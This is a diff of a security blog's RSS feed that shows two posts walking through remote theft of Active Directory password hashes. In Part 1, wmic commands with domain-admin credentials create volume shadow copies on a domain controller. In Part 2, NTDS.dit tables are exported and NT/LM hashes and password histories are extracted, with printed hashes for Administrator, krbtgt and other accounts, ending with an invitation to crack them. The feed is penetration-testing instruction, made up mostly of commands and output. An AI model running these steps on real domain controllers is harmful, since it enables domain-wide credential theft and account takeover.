@@ -17,60 +17,44 @@
       
       <guid>https://malicious.link/post/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</guid>
       <description>&lt;p&gt;Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:&lt;/p&gt;
-
 &lt;p&gt;From: &lt;a href=&#34;http://www.ntdsxtract.com/&#34;&gt;http://www.ntdsxtract.com/&lt;/a&gt;&lt;/p&gt;
-
 &lt;p&gt;Download: &lt;a href=&#34;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&#34;&gt;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Download: &lt;a href=&#34;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&#34;&gt;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Extract the tools:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tar zxvf libesedb-alpha-20120102.tar.gz
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Extract the tools:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tar zxvf libesedb-alpha-20120102.tar.gz
 unzip ntdsxtract_v1_0.zip
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/# cd libesedb-20120102
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/# cd libesedb-20120102
 root@wpad:~/blog/libesedb-20120102# ./configure 
 root@wpad:~/blog/libesedb-20120102# make
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
 root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
-esedbexport 20120102
+esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
     
 Missing source file.
-Use esedbexport to export items stored in an Extensible Storage Engine (ESE)
-Database (EDB) file
+Use esedbexport to export items stored in an Extensible Storage Engine &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ESE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Database &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;EDB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; file
 
-Usage: esedbexport [ -c codepage ] [ -l logfile ] [ -m mode ] [ -t target ]
-                   [ -T table_name ] [ -hvV ] source
+Usage: esedbexport &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -c codepage &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -l logfile &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -m mode &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -t target &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -T table_name &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -hvV &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; source
 
 	source: the source file
 
 	-c:     codepage of ASCII strings, options: ascii, windows-874,
 	        windows-932, windows-936, windows-1250, windows-1251,
-	        windows-1252 (default), windows-1253, windows-1254
+	        windows-1252 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, windows-1253, windows-1254
 	        windows-1255, windows-1256, windows-1257 or windows-1258
 	-h:     shows this help
 	-l:     logs information about the exported items
-	-m:     export mode, option: all, tables (default)
-	        &#39;all&#39; exports all the tables or a single specified table with indexes,
-	        &#39;tables&#39; exports all the tables or a single specified table
+	-m:     export mode, option: all, tables &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt; exports all the tables or a single specified table with indexes,
+	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tables&amp;#39;&lt;/span&gt; exports all the tables or a single specified table
 	-t:     specify the basename of the target directory to export to
-	        (default is the source filename) esedbexport will add the suffix
+	        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is the source filename&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; esedbexport will add the suffix
 	        .export to the basename
 	-T:     exports only a specific table
 	-v:     verbose output to stderr
@@ -79,40 +63,34 @@ root@wpad:~/blog/libesedb-20120102/esedbtools#
 
 
 root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
-esedbexport 20120102
+esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
 
 Opening file.
-Exporting table 1 (MSysObjects) out of 12.
-Exporting table 2 (MSysObjectsShadow) out of 12.
-Exporting table 3 (MSysUnicodeFixupVer2) out of 12.
-Exporting table 4 (datatable) out of 12.
-Exporting table 5 (hiddentable) out of 12.
-Exporting table 6 (link_table) out of 12.
-Exporting table 7 (sdpropcounttable) out of 12.
-Exporting table 8 (sdproptable) out of 12.
-Exporting table 9 (sd_table) out of 12.
-Exporting table 10 (MSysDefrag2) out of 12.
-Exporting table 11 (quota_table) out of 12.
-Exporting table 12 (quota_rebuild_progress_table) out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjects&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjectsShadow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysUnicodeFixupVer2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datatable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;hiddentable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;link_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdpropcounttable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdproptable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sd_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysDefrag2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_rebuild_progress_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
 Export completed.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
 root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
 root@wpad:~/blog/NTDSXtract 1.0# ls
 dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
 root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
 DSUsers
 Extracts information related to user objects
 
-usage: dsusers.py   [option]
+usage: dsusers.py   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;option&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   options:
     --rid 
           List user identified by RID
@@ -129,23 +107,20 @@ usage: dsusers.py   [option]
     --membership
           List groups of which the user is a member
 root@wpad:~/blog/NTDSXtract 1.0# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;But we like hashes:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But we like hashes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
 Running with options:
 	Extracting password hashes
 	Extracting password history
 Initialising engine...
-Scanning database - 100% -&amp;gt; 3475 records processed
-Extracting schema information - 100% -&amp;gt; 1549 records processed
+Scanning database - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3475&lt;/span&gt; records processed
+Extracting schema information - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1549&lt;/span&gt; records processed
 Extracting object links...
 
 List of users:
-==============
+&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
 
-Record ID:           3562
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3562&lt;/span&gt;
 User name:           Administrator
 User principal name: 
 SAM Account name:    Administrator
@@ -159,8 +134,8 @@ Password last set:    2012-08-22 02:49:42.899576
 Last logon:           2013-05-15 04:08:04.547236
 Last logon timestamp: 2013-05-15 04:06:55.577353
 Bad password time     2013-06-07 02:34:34.560516
-Logon count:          9
-Bad password count:   1
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
 User Account Control:
 	NORMAL_ACCOUNT
 Ancestors:
@@ -169,7 +144,7 @@ Password hashes:
 	Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
 Password history:
 
-Record ID:           3563
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3563&lt;/span&gt;
 User name:           Guest
 User principal name: 
 SAM Account name:    Guest
@@ -183,8 +158,8 @@ Password last set:    2013-03-14 06:54:22.029303
 Last logon:           2013-03-14 06:54:27.012817
 Last logon timestamp: 2013-03-14 06:32:41.834022
 Bad password time     2013-06-07 03:07:46.499917
-Logon count:          0
-Bad password count:   10
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
 User Account Control:
 	PWD Not Required
 	NORMAL_ACCOUNT
@@ -195,7 +170,7 @@ Password hashes:
 	Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
 Password history:
 
-Record ID:           3564
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3564&lt;/span&gt;
 User name:           user
 User principal name: 
 SAM Account name:    user
@@ -209,8 +184,8 @@ Password last set:    2013-03-14 03:25:11.793912
 Last logon:           2013-06-07 02:51:54.152191
 Last logon timestamp: 2013-06-07 02:51:54.152191
 Bad password time     2013-04-19 05:25:40.412670
-Logon count:          67
-Bad password count:   0
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 User Account Control:
 	NORMAL_ACCOUNT
 	PWD Never Expires
@@ -225,7 +200,7 @@ Password history:
 	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
 	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
 
-Record ID:           3610
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3610&lt;/span&gt;
 User name:           krbtgt
 User principal name: 
 SAM Account name:    krbtgt
@@ -239,8 +214,8 @@ Password last set:    2012-08-22 03:16:03.166457
 Last logon:           Never
 Last logon timestamp: Never
 Bad password time     Never
-Logon count:          0
-Bad password count:   0
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 User Account Control:
 	Disabled
 	NORMAL_ACCOUNT
@@ -252,7 +227,7 @@ Password history:
 	krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
 	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
 
-Record ID:           3762
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3762&lt;/span&gt;
 User name:           John Doe
 User principal name: jdoe@projectmentor.net
 SAM Account name:    jdoe
@@ -266,8 +241,8 @@ Password last set:    2013-04-19 07:11:49.849592
 Last logon:           2013-06-07 02:56:25.677855
 Last logon timestamp: 2013-06-05 13:04:11.674344
 Bad password time     2013-05-02 03:01:12.536251
-Logon count:          242
-Bad password count:   0
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;242&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 User Account Control:
 	NORMAL_ACCOUNT
 	PWD Never Expires
@@ -277,7 +252,7 @@ Password hashes:
 	John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
 Password history:
 
-Record ID:           3797
+Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3797&lt;/span&gt;
 User name:           Random User
 User principal name: randy@projectmentor.net
 SAM Account name:    randy
@@ -291,8 +266,8 @@ Password last set:    2013-04-19 06:59:25.423280
 Last logon:           2013-04-08 02:34:10.482690
 Last logon timestamp: 2013-04-08 02:34:10.482690
 Bad password time     Never
-Logon count:          1
-Bad password count:   0
+Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 User Account Control:
 	NORMAL_ACCOUNT
 	PWD Never Expires
@@ -303,9 +278,7 @@ Password hashes:
 Password history:
 root@wpad:~/blog/NTDSXtract 1.0# 
 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;All done. Start crackin&amp;rsquo;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All done. Start crackin&amp;rsquo;&lt;/p&gt;
 </description>
     </item>
     
@@ -318,21 +291,13 @@ root@wpad:~/blog/NTDSXtract 1.0#
       <description>&lt;blockquote&gt;
 &lt;p&gt;This and part 2 are mostly just an update to &lt;a href=&#34;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&#34;&gt;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/a&gt; but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.&lt;/p&gt;
 &lt;/blockquote&gt;
-
-&lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
-
+&lt;p&gt;Ever run into a Domain Controller that wasn&#39;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
 &lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
 dir \\DC1\C$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
-
-&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
-
-&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&#39;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
+&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&#39;s DB much like Window&#39;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
+&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&#39;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&#39;t work very nicely in a Meterpreter shell:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;quot;
 Executing (Win32_Process)-&amp;gt;Create()
 Method execution successful.
@@ -342,21 +307,16 @@ instance of __PARAMETERS
         ProcessId = 7304;
         ReturnValue = 0;
 };
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;To break down this command:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To break down this command:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;wmic /node:DC1&lt;/code&gt; - tells it to interact with the WMI API on DC1&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;/user:DOMAIN\domainadminsvc /password:domainadminsvc123&lt;/code&gt; - authentication&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;process call create&lt;/code&gt; - WMI speak for create a process&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&amp;rsquo;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&#39;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;vssadmin list shadows&lt;/code&gt; - List any shadow volumes that already exist&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&lt;/code&gt; - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;Process starts and then you need to view the output file by either copying it down, &lt;code&gt;type \DC1\C$\TEMP\output.txt&lt;/code&gt; or mount the C drive as a network share. Either way you should either see something like this:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
@@ -371,41 +331,23 @@ Contents of shadow copy set ID: {671090fd-0198}
          Provider: &#39;Microsoft Software Shadow Copy provider 1.0&#39;
          Type: ClientAccessibleWriters
          Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;or&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
 
 No items found that satisfy the query
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&#39;t have to remember this):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&#39;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
 &lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;
-
